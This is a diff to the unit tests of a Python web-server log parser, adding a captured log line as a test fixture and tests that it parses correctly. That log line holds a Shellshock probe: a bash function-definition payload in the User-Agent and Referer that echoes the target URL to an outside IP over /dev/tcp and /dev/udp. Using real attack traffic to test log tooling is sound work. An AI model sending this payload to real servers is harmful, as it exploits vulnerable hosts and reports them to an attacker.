@@ -20,6 +20,10 @@ import logread
 ip1 = "221.127.9.141"
 ip2 = "82.132.214.244"
 
+NASTY_SHIT = """
+2015-02-26 20:00:24+0000 [HTTPChannel,3229,68.116.30.102] 68.116.30.102 EVOLVINGOUTOFEDEN.ORG - [26/Feb/2015:20:00:24 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 302 234 "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"" "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"
+""".strip()
+
 
 class TestParser(tb.TestCase):
     def setUp(self):
@@ -53,12 +57,29 @@ class TestParser(tb.TestCase):
               "http://freedomtodoubt.com/",
               "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SPH-L710 Build/JSS15J) "+\
               "AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile " +\
-              "Safari/534.30"
-          ]),
+              "Safari/534.30"]),
+            (NASTY_SHIT,
+             ["evolvingoutofeden.org",
+              "68.116.30.102",
+              dt(2015, 02, 26, 20, 0, 24),
+              "/cgi-bin/test-cgi",
+              302,
+              "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
+              "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
+              "test-cgi > /dev/udp/23.227.199.185/80\"",
+              "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
+              "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
+              "test-cgi > /dev/udp/23.227.199.185/80"])
         )
         for text, expected in textExpected:
-            self.assertEqual(self.p.parseLine(text), expected)
+            self.assertItemsEqual(self.p.parseLine(text), expected)
 
+    def test_parse_nastyShit(self):
+        dtp, record = self.p.makeRecord(NASTY_SHIT)
+        self.assertEqual(dtp, dt(2015, 02, 26, 20, 0, 24))
+        dtp, record = self.p.makeRecord(NASTY_SHIT)
+        self.assertEqual(dtp, dt(2015, 02, 26, 20, 0, 24))
+            
     def test_makeRecord(self):
         def mr(*args):
             stuff = stuffBase + list(args)
@@ -122,7 +143,9 @@ class TestReader(tb.TestCase):
         self.r = logread.Reader(
             os.path.join(tb.moduleDir(parent=True), 'log'),
             rules={'BotMatcher': tb.RULES_BOT},
-            vhost="freedomtodoubt.com")
+            vhost="evolvingoutofeden.com",
+            cores=1, verbose=False,
+        )
 
     def test_complains(self):
         self.assertRaises(OSError, logread.Reader, 'bogusdir')
@@ -136,8 +159,12 @@ class TestReader(tb.TestCase):
                 self.assertIsInstance(ipList, list)
                 self.assertTrue(len(ipList) > 1)
                 self.assertIsInstance(records, dict)
-                self.assertTrue(len(records) > 100)
+                N = len(records)
+                self.assertTrue(
+                    N > 100,
+                    "Expected at least 100 records, got {:d}".format(N))
         
         return self.r.run().addBoth(done)
+        
 
             
